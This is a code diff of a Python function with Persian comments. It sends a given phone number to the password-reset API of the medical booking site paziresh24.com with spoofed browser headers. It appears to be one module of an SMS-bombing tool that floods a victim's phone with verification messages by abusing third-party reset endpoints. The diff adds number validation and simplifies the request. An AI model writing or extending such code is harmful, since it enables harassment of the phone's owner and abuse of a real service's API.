@@ -68,32 +68,30 @@ def paziresh24(phone):
     try:
         # پردازش شماره موبایل
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        # بررسی فرمت شماره (باید 10 رقمی باشد)
+        if len(formatted_phone) != 10 or not formatted_phone.startswith('9'):
+            print("خطا: فرمت شماره نامعتبر است")
+            return False
+            
         formatted_phone = f"0{formatted_phone}"
-        
-        # اول صفحه اصلی را بگیر تا توکن‌ها رو دریافت کنیم
-        session = requests.Session()
-        home_response = session.get("https://www.paziresh24.com/", timeout=10)
-        
-        # استخراج توکن از صفحه (اگر وجود داشته باشه)
-        xsrf_token = ""
-        # اینجا باید الگوی استخراج توکن رو اضافه کنی
+        print(f"شماره پردازش شده: {formatted_phone}")
         
         # ارسال به API بازیابی رمز
         headers = {
             "Accept": "application/json, text/plain, */*",
             "accept-timezone": "Asia/Tehran",
             "content-type": "application/json; charset=utf-8",
-            "User-Agent": random.choice(user_agents),
-            "Referer": "https://www.paziresh24.com/",  # بدون فاصله
-            "X-XSRF-TOKEN": xsrf_token,
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Referer": "https://www.paziresh24.com/",
         }
         
         payload = {
             "mobile": formatted_phone
         }
         
-        response = session.post(
-            "https://apigw.paziresh24.com/gozargah/resetpassword",  # بدون فاصله
+        response = requests.post(
+            "https://apigw.paziresh24.com/gozargah/resetpassword",
             json=payload,
             headers=headers,
             timeout=10,
